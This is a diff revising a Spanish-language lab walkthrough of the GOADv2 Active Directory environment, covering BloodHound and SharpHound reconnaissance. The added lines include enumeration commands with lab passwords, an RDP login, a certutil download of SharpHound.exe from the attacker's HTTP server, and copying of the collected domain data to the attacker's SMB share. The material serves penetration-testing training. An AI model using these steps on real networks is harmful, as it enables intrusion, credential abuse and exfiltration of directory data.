@@ -1200,7 +1200,7 @@ SMB         192.168.56.11   445    WINTERFELL       [+] north.sevenkingdoms.loca
 
 # BloodHound
 
-Este lab puede dar un error en los nameservers, al tratarse de algo local, en caso de que nos presente un error, vamos a configurar el archivo /etc/resolv.cof y agregamos la linea nameserver  127.0.0.1
+Este lab puede dar un error en los nameservers, al tratarse de algo local, en caso de que nos presente un error, vamos a configurar el archivo /etc/resolv.conf y agregamos la linea nameserver  127.0.0.1
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/Bloodhound/12]
@@ -1217,8 +1217,8 @@ Este lab puede dar un error en los nameservers, al tratarse de algo local, en ca
 ───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ```
 
-ahora con la herramienta bloodhound-python, que recopila información sobre la estructura de la red, los usuarios, los grupos y las relaciones entre ellos para ayudar a identificar posibles vulnerabilidades y riesgos de seguridad, vamos a extraer esta data, para luego visualizarla en la herramienta bloodhound, tener en cuenta que bloodhound , bloodhound-python  son diferentes, bloodhound-python  nos permite como decimos en este parrafo, extraer la información necesaria, mientras que bloodhound, nos ayuda graficar estos datos.
-Iniciomos la extración del dominio sevenkingdoms.local
+ahora con la herramienta bloodhound-python, que recopila información sobre la estructura de la red, los usuarios, los grupos y las relaciones entre ellos para ayudar a identificar posibles vulnerabilidades y riesgos de seguridad, vamos a extraer esta data, para luego visualizarla en la herramienta bloodhound, tener en cuenta que bloodhound y bloodhound-python  son diferentes, bloodhound-python  nos permite como decimos en este parrafo, extraer la información necesaria, mientras que bloodhound, nos ayuda a graficar estos datos.
+Iniciamos con la extración del dominio sevenkingdoms.local conn el comando `bloodhound-python -c all -u brandon.stark@north.sevenkingdoms.local -p 'iseedeadpeople' -ns 192.168.56.10 -d sevenkingdoms.local -dc kingslanding.sevenkingdoms.local`
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/Bloodhound/10]
@@ -1244,7 +1244,7 @@ Permissions Size User        Date Modified Name
 .rwxrwxrwx   36k angussmoody 21 jul 21:43  20230721214312_users.json
 ```
 
-Ahora extraemos la información de north.sevenkingdoms.local
+Ahora continuamos con la extraemos la información de north.sevenkingdoms.local con el comando `bloodhound-python -c all -u brandon.stark@north.sevenkingdoms.local -p 'iseedeadpeople' -ns 192.168.56.11 -d north.sevenkingdoms.local -dc winterfell.north.sevenkingdoms.local`
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/Bloodhound/11]
@@ -1275,7 +1275,7 @@ Permissions Size User        Date Modified Name
 .rwxrwxrwx   39k angussmoody 21 jul 21:40  20230721214041_users.json
 ```
 
-y terminamos con el dominio essos.local, estos herramienta nos permite realizar la extración de ésta información, pero no cuenta con
+y terminamos con el dominio essos.local con el comando `bloodhound-python -c all -u brandon.stark@north.sevenkingdoms.local -p 'iseedeadpeople' -ns 192.168.56.12 -d essos.local -dc meereen.essos.local` esta herramienta nos permite realizar la extración de ésta información, pero no cuenta con tantos detalles como otras herramientas, por ejemplo la próxima herramienta que vamos a ver.
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/Bloodhound/12]
@@ -1302,7 +1302,7 @@ Permissions Size User        Date Modified Name
 .rwxrwxrwx   24k angussmoody 21 jul 21:37  20230721213710_users.json
 ```
 
-Pero si tenemos un acceso rdp podemos realizar la extración de la data con una herramienta más completa llamada [sharphound](https://github.com/BloodHoundAD/SharpHound/releases),  esta herramienta realiza una extración más completa de los datos, podemos realizarlo de muchas maneras, en este caso vamos a utilizar la herramienta xfreerdp, para tener un acceso remoto al equipo SRV02
+Si tenemos un acceso rdp podemos realizar la extración de la data con una herramienta más completa llamada [sharphound](https://github.com/BloodHoundAD/SharpHound/releases){:target="_blank"},  esta herramienta realiza una extración más completa de los datos, para realizar la conexión rdp podemos realizarlo de muchas maneras, en este caso vamos a utilizar la herramienta xfreerdp, para tener un acceso remoto al equipo SRV02 vamos a realizarlo con el comando `xfreerdp /u:jon.snow /p:iknownothing /d:north /v:192.168.56.22 /cert-ignore`
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/Bloodhound]
@@ -1311,9 +1311,9 @@ Pero si tenemos un acceso rdp podemos realizar la extración de la data con una 
 
 ![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%206.png)
 
-vamos a abrimos una cmd y nos pasamos el [sharphound](https://github.com/BloodHoundAD/SharpHound/releases) para este caso la versión 1.1.1 tener en cuenta que depende de la versión que utilicemos ésta va a ser compatible con una versión expecifica de [bloodhound](https://github.com/BloodHoundAD/BloodHound), en este caso la servipon sharphound 1.1.1 es compatible con bloodhound 4.3.1
+vamos a abrimos una cmd y nos pasamos el [sharphound](https://github.com/BloodHoundAD/SharpHound/releases) para este caso la versión 1.1.1 tener en cuenta que depende de la versión que utilicemos ésta va a ser compatible con una versión expecifica de [bloodhound](https://github.com/BloodHoundAD/BloodHound){:target="_blank"}, en este caso la herramienta sharphound 1.1.1 es compatible con bloodhound 4.3.1
 
-Nos creamos un servidor http con python3 es nuestra máquina atacante
+Creamos un servidor http con python3 es nuestra máquina atacante
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/SharpHound-v1.1.1]
@@ -1325,7 +1325,7 @@ Para este ejemplo, me cree un directorio llamado test en el escritorio del usuar
 
 ![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%207.png)
 
-con la herramienta certutil.exe de windows, vamos a subir el sharpHound.exe
+con la herramienta certutil.exe de windows, vamos a subir el sharpHound.exe con el comando `certutil.exe -urlcache -split -f http://192.168.56.101/SharpHound.exe SharpHound.exe`
 
 ![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%208.png)
 
@@ -1347,7 +1347,7 @@ una vez terminamos de ejecutar los comandos, nos queda como resuldatos unos arch
 
 ![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2010.png)
 
-descargarmos estos archivos, para este ejemplo lo vamos a realizar con la herramienta impacket-smbserver, pero se podría realizar de muchas formas, como podemos ver en este árticulo de [ironhackers](https://ironhackers.es/cheatsheet/transferir-archivos-post-explotacion-cheatsheet/)
+descargarmos estos archivos, para este ejemplo lo vamos a realizar con la herramienta impacket-smbserver, pero se podría realizar de muchas formas, como podemos ver en este árticulo de [ironhackers](https://ironhackers.es/cheatsheet/transferir-archivos-post-explotacion-cheatsheet/){:target="_blank"}
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/SharpHound-v1.1.1]
@@ -1362,11 +1362,19 @@ Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corpo
 [*] Config file parsed
 ```
 
-ahora desde la máquina victima vamos pasando archivo por archico con el comando copy
+ahora desde la máquina victima vamos pasando archivo por archico con los comandos
+
+```csharp
+copy 20230721201127_bh_north_sevenkingdoms.zip \\192.168.56.101\test\20230721201127_bh_north_sevenkingdoms.zip
+
+copy 20230721201610_bh_sevenkingdoms.zip \\192.168.56.101\test\20230721201610_bh_sevenkingdoms.zip
+
+copy 20230721201813_bh_essos.zip \\192.168.56.101\test\20230721201813_bh_essos.zip
+```
 
 ![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2011.png)
 
-Una vez tenemos los archivos debemos correr la herramienta bloodhound, esta herramienta corre en compañía de neo4j, para realizar la configuración de esta, se puede consultar en la [wiki](https://bloodhound.readthedocs.io/en/latest/index.html) oficial de bloodhound, tener en cuenta que para la versión 4.3.1 de bloodhound se debe tener una version de neo4j superior a 4.4.0 en este caso yo cuento con la versión 4.4.1 y le cree un alias en la bashrc para realizar el llamado de la herramienta.
+Una vez tenemos los archivos debemos correr la herramienta bloodhound, esta herramienta corre en compañía de neo4j, para realizar la configuración de esta, se puede consultar en la [wiki](https://bloodhound.readthedocs.io/en/latest/index.html){:target="_blank"} oficial de bloodhound, tener en cuenta que para la versión 4.3.1 de bloodhound se debe tener una version de neo4j superior a 4.4.0 en este caso yo cuento con la versión 4.4.1 y le cree un alias en la bashrc para realizar el llamado de la herramienta.
 
 Corremos la herramienta con el comando `neo4j console`  en mi caso como dije en el anterior parrafo creé un alias llamado Neo4jcon, para realizarlo de forma  más rápida, una vez la herramienta esté lista nos dará un mensaje de Started
 
@@ -1397,7 +1405,7 @@ Starting Neo4j.
 2023-07-22 22:15:53.530+0000 INFO  Started.
 ```
 
-Una vez esté corriendo neo4j (la primera vez se debe configurar una nueva contraseña, por defecto viene con las credenciales neo4j:neo4j) esta configuracion se realiza en http://localhost:7474/ como nos dice la herramienta, luego de correr el neo4j vamos a correr el bloodhound con el comando `./BloodHound --no-sandbox como nos dice la` [wiki](https://bloodhound.readthedocs.io/en/latest/index.html), para este caso también me cree un alias para realizarlo más cómodamente
+Una vez esté corriendo neo4j (la primera vez se debe configurar una nueva contraseña, por defecto viene con las credenciales neo4j:neo4j) esta configuracion se realiza en http://localhost:7474/ como nos dice la herramienta, luego de correr el neo4j vamos a correr el bloodhound con el comando `./BloodHound --no-sandbox como nos dice la` [wiki](https://bloodhound.readthedocs.io/en/latest/index.html){:target="_blank"}, para este caso también me cree un alias para realizarlo más cómodamente
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody]
@@ -1410,9 +1418,8 @@ Este comando nos abrirá la herramienta que nos pide los datos de incio de sesi�
 
 ![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2012.png)
 
-Write a caption
 
-una ver iniciamos sesión nos saldrá la herramienta de esta menera, sin datos cargados, debemos dar clic en el bóton Upload Data y subir los archivos .zip descargados anteriormente, para este ejemplo subimos el del dominio sevenkingdoms.local
+una vez iniciamos sesión nos saldrá la herramienta de esta menera, sin datos cargados, debemos dar clic en el bóton Upload Data y subir los archivos .zip descargados anteriormente, para este ejemplo subimos el del dominio sevenkingdoms.local
 
 ![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2013.png)
 
@@ -1440,7 +1447,7 @@ MATCH q=(d:Domain)-[r:Contains*1..]->(n:Group)<-[s:MemberOf]-(u:User) RETURN q
 
 ![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2017.png)
 
-Ver las ACL de los usuarios
+Ver las ACL de los usuarios, entre otras cosas que veremos más adelante.
 
 ```csharp
 MATCH p=(u:User)-[r1]->(n) WHERE r1.isacl=true and not tolower(u.name) contains 'vagrant' RETURN p
